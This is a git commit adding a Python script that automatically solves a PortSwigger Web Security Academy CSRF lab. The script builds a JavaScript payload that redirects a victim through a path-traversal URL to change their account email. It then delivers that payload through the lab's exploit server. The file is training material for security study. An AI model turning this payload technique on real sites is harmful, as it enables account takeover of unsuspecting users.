ca66a4cad482e0405ed2f5e19742556367434779
yf <73434276+yufongg@users.noreply.github.com>
2025-01-09 01:35:06 +0800

    Create csrf8.py

---
+++ csrf/csrf8/csrf8.py
@@ -0,0 +1,71 @@
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+from time import sleep
+from bs4 import BeautifulSoup
+import urllib
+
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+# lab_url: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
+# author: 0xyf
+
+
+class CSRF8:
+    def __init__(self):
+        self.lab_id = "0af4009e04ca3b5180ebdf1d00320034"
+        self.proxies = {"https": "http://127.0.0.1:8080"}
+
+        self.url = f"https://{self.lab_id}.web-security-academy.net"
+        self.vuln_url = f"{self.url}/post/comment/confirmation?postId="
+
+    def get_exploit_srv_url(self):
+        r = requests.get(self.url)
+        soup = BeautifulSoup(r.text, "html.parser")
+        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")
+
+    def execute_request(self, data):
+        r = requests.post(
+            f"{self.exploit_srv_url}",
+            data=data,
+            proxies=self.proxies,
+            verify=False,
+        )
+        return r
+
+    def csrf(self):
+        self.get_exploit_srv_url()
+        payload = f"""<script>
+        var baseUrl = "{self.vuln_url}";
+        var relativePath = "../my-account/change-email?email=0xyf@0xyf.com&submit=1";
+        location = baseUrl + encodeURIComponent(relativePath);
+        </script>
+        """
+        data = {
+            "urlIsHttps": "on",
+            "responseFile": "/exploit",
+            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
+            "formAction": "DELIVER_TO_VICTIM",
+            "responseBody": payload,
+        }
+        r = self.execute_request(data)
+
+    def check_solved(self):
+        sleep(2)
+        r = requests.get(self.url)
+        if "Congratulations, you solved the lab!" in r.text:
+            print("Lab Solved")
+        else:
+            print("Did not solve lab, check payload")
+
+    def solve(self):
+        self.csrf()
+        self.check_solved()
+
+
+def main():
+    CSRF8().solve()
+
+
+if __name__ == "__main__":
+    main()
